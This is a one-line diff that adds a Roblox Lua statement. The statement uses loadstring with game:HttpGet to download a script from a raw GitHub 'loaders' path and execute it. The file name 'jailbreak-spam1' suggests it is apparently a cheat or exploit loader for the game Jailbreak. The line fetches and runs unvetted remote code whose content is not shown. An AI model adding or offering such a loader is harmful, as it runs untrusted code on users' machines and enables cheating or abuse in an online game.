@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/jailbreak-spam1-isck55d3l1yrt8.lua"))()
